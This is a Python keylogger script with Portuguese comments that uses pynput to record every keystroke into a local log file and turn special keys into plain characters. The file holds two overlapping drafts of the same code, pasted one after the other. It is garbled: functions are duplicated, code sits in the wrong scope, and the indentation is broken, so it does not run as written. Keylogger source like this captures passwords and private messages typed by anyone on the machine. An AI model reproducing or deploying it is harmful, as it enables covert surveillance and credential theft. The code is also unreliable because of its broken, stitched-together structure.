#em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#definir a localização do arquivo de log
logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #converter a tecla pressionada para string
    keydata = str(key)

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
    l.join()

keydata = keydata.replace("'", "")

translate_keys = {
     "Key.space": " ",
     "Key.shift_r": "",
     "Key.shift_l": "",
     "Key.enter": "\n",
     "Key.alt": "",
     "Key.esc": "",
     "Key.cmd": "",
     "Key.caps_lock": "",
}

for key in translate_keys:
    #key recebe a chave do dicionário translate_keys
    #substituir a chave (key) pelo seu valor (translate_keys[key])
    keydata = keydata.replace(key, translate_keys[key])

#em pynput, importar o método Listener do teclado
logFile = "/home/diegorego/keylogger_black_genesis/log.txt"

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla personalizada
    via Listener e escrever no arquivo de log
    '''

    #dicionário com as teclas a serem traduzidas
    translate_keys = {
         "Key.space": " ",
	 "Key.shift_r": "",
	 "Key.shift_l": "",
	 "Key.enter": "\n",
	 "Key.alt": "",
	 "Key.esc": "",
	 "Key.cmd": "",
 	 "Key.caps_lock": "",
}

#converter a tecla pressionada para string
keydata = str(key)

#remover as aspas simples que limitam os caracteres
keydata = keydata.replace("'", "")

for key in translate_keys:
    #key recebe a chave do dicionário translate_keys
    #substituir a chave (key) pelo seu valor (translate_keys[key])
    keydata = keydata.replace(key, translate_keys[key])

#abrir o arquivo de log no modo append
with open(logFile, "a") as f:
    f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as l:
   l.join()
